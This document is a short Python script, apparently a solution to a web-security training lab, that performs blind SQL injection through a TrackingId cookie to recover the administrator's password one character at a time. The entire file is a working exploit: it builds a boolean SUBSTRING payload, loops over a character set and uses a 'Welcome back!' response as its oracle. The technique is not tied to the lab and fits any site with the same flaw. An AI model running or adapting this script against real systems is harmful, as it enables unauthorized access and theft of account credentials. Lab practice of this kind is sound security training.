#Blind SQL injection with conditional responses
import requests
import string

def main():
    # Get URL from user
    url = input("Enter the lab URL (e.g., https://xxx.web-security-academy.net/): ").strip()
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    if not url.endswith('/'):
        url += '/'

    # Get real cookies
    resp = requests.get(url)
    tracking_id = resp.cookies.get('TrackingId')
    session_id = resp.cookies.get('session')

    if not tracking_id or not session_id:
        print("[!] Failed to get cookies. Check the URL.")
        return

    print(f"[+] Got cookies: TrackingId={tracking_id}, session=...")

    charset = string.ascii_lowercase + string.digits
    password = ""

    print("\n[+] Starting blind SQL injection...\n")

    for pos in range(1, 21):
        print(f"[+] Trying position {pos}...")
        found = False
        for char in charset:
            # Inject AFTER the real TrackingId
            payload = f"{tracking_id}' AND (SELECT SUBSTRING(password,{pos},1) FROM users WHERE username='administrator')='{char}'--"

            cookies = {
                "TrackingId": payload,
                "session": session_id
            }

            r = requests.get(url, cookies=cookies)

            if "Welcome back!" in r.text:
                password += char
                print(f"[✓] Position {pos}: '{char}' → '{password}'")
                found = True
                break

        if not found:
            print(f"[!] Could not find char at position {pos}")
            password += "?"

    print(f"\n[🎉] Final password: {password}")

if __name__ == "__main__":
    main()
